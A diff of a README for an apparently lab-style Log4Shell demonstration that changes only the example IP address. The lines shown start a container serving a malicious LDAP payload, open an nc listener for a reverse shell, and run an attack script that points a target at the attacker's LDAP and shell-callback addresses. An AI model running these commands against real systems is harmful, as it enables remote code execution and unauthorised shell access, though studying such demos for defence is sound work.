@@ -15,10 +15,10 @@ podman run -p 1389:1389 -p 8888:8888  quay.io/apoczeka/log4shell -i <host_addres
 
 <host_address> is your host machine address from WIFI or LAN interface\
 \
-If you run it on a computer that has the address 192.168.50.100 you should run:\
+If you run it on a computer that has the address 192.168.15.107 you should run:\
 
 ```bash
-podman run -p 1389:1389 -p 8888:8888  quay.io/apoczeka/log4shell -i 192.168.50.100 -l 1389 -p 8888
+podman run -p 1389:1389 -p 8888:8888  quay.io/apoczeka/log4shell -i 192.168.15.107 -l 1389 -p 8888
 ```
 
 ### 3. Listen for revers shell
@@ -36,7 +36,7 @@ nc -l 5555
 For example:
 
 ```bash
-./attack-revers.sh localhost:8080 192.168.50.100:1389 192.168.50.100:5555
+./attack-revers.sh localhost:8080 192.168.15.107:1389 192.168.15.107:5555
 ```
 
 ![](./log4shell.png)
